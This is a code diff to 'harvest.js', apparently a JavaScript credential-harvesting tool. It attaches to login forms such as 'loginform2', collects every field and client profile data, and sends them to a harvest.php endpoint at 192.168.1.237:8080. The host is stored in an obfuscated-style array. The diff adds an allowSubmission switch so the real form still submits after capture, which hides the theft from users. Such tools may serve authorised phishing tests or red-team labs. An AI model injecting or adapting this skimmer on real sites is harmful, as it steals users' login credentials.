@@ -1,9 +1,15 @@
-var dynamicTrackers = true;
-var bindAllFormsSwitch = true;
+/* harvest.js 
+*
+*  https://github.com/toneillcodes/js-harvester
+*
+*/
+var dynamicTrackers = true;			//	(boolean, true/false) 
+var bindAllFormsSwitch = true;		//	(boolean, true/false)
 var formName = "loginform2";
-var enableEncoding = true;
-var usePost = false;
-var trackClients = true;
+var enableEncoding = true;			//	(boolean, true/false)
+var usePost = false;				//	(boolean, true/false)
+var trackClients = true;			//	(boolean, true/false)
+var allowSubmission = false;		//	(boolean, true/false)
 var _0x3745 = ["http","://","192.168.1.237:8080","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
 
 $(document).ready(function() {
@@ -36,8 +42,9 @@ function bindByName(formName) {
 function bindForm(form) {
 	if(form) {
         form.addEventListener('submit', function(e){
-				// for testing purposes
-				e.preventDefault();
+				if(allowSubmission == false) {
+					e.preventDefault();
+				}
 				let payload = grabAll(form);
 				if(trackClients) {
 					let clientInfo = profileClient();
